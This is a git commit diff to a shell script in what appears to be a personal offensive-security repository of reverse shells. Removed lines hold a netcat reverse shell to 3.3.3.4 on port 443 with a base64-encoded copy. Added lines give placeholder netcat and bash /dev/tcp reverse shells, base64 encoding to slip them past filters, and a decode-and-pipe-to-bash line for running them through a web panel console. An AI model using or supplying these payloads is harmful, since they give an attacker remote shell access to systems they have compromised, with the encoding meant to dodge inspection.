57a3e6faef2e530a49d403b0bacf5a195e6fe98f
SebSecRepos <130188315+SebSecRepos@users.noreply.github.com>
2023-12-29 11:43:53 -0300

    Update disabled_rev_shell.sh

--- Linux/reverse_shells/disabled_rev_shell.sh
+++ Linux/reverse_shells/disabled_rev_shell.sh
@@ -1,7 +1,11 @@
 #!/bin/bash
 
-echo -e "nc -e /bin/bash 3.3.3.4 443" | base64 
-#  bmMgLWUgL2Jpbi9iYXNoIDMuMy4zLjQgNDQzCg==
+##-------------netcat------------------------
+echo -e "nc -e /bin/bash ip port" | base64 
 
-##Trougth a interactive console in web panel
-echo -n "bmMgLWUgL2Jpbi9iYXNoIDMuMy4zLjQgNDQzCg==" | base64 -d | bash
+#------------------Socket--------------------#
+echo -e "bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" | base64 
+
+
+##in a interactive console in web panel
+echo -n "base64result" | base64 -d | bash
